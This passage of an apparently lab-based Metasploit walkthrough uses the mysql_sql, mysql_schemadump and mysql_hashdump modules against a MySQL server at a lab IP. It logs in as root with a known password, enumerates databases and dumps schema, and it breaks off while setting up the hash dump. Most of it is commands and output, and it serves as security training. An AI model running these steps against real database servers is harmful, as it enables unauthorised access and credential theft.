</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>
<br>
<p>Run the exploit. By default it will test with the <code>select version()</code> command, what result does this give you?</p>






<pre tabindex="0"><code>5.7.29-0ubuntu0.18.04.1</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Running module against 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Sending statement: <span style="color:#a6e3a1">&#39;select version()&#39;</span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | 5.7.29-0ubuntu0.18.04.1 |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>Great! We know that our exploit is landing as planned. Let&rsquo;s try to gain some more ambitious information. Change the sql option to show databases. How many databases are returned?</p>






<pre tabindex="0"><code>4</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> SQL show databases
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#f5e0dc">SQL</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; show databases
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>PASSWORD password no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RHOSTS 10.10.151.196 yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>it.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>SQL show databases yes The SQL to execute.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>USERNAME root no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Running module against 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Sending statement: <span style="color:#a6e3a1">&#39;show databases&#39;</span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | information_schema |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | mysql |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | performance_schema |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | sys |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<h4 id="exploiting-mysql">Exploiting MySQL</h4>
<p>Take a sanity check before moving on to try and exploit the database fully. We know:</p>
<ol>
<li>MySQL server credentials</li>
<li>The version of MySQL running</li>
<li>The number of Databases, and their names.</li>
</ol>
<br>
<p><em>Schema</em>
In MySQL, physically, a <code>schema</code> is synonymous with a <code>database</code>. You can substitute the keyword schema instead of database in MySQL SQL syntax, for example using <code>CREATE SCHEMA</code> instead of <code>CREATE DATABASE</code>. Some other database products draw a distinction.</p>
<p><em>Hashes</em>
Hashes are the product of a cryptographic algorithm to turn a variable length input into a fixed length output. In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data.</p>
<br>
<p>First, let&rsquo;s search for and select the <code>mysql_schemadump</code> module. What&rsquo;s the module&rsquo;s full name?</p>






<pre tabindex="0"><code>auxiliary/scanner/mysql/mysql_schemadump</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; search mysql_schemadump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/mysql/mysql_schemadump normal No MYSQL Schema Dump</span></span></code></pre></div>
<br>
<p>Great! Now, you&rsquo;ve done this a few times by now so I&rsquo;ll let you take it from here. Set the relevant options, run the exploit. What&rsquo;s the name of the last table that gets dumped?</p>






<pre tabindex="0"><code>x$waits_global_by_latency</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>DISPLAY_RESULTS <span style="color:#89dceb">true</span> yes Display the Results to the Screen
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>etasploit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>- TableName: x<span style="color:#f5e0dc">$waits_global_by_latency</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>  Columns:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>  - ColumnName: events
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    ColumnType: varchar<span style="color:#89dceb;font-weight:bold">(</span>128<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  - ColumnName: total
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  - ColumnName: total_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  - ColumnName: avg_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  - ColumnName: max_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better&hellip; search for and select the mysql_hashdump module. What&rsquo;s the module&rsquo;s full name?</p>






<pre tabindex="0"><code>auxiliary/scanner/mysql/mysql_hashdump</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; search mysql_hashdump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/mysql/mysql_hashdump normal No MYSQL Password Hashdump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">1</span> auxiliary/analyze/crack_databases normal No Password Cracker: Databases</span></span></code></pre></div>
<br>
<p>Again, I&rsquo;ll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?</p>






<pre tabindex="0"><code>carl</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
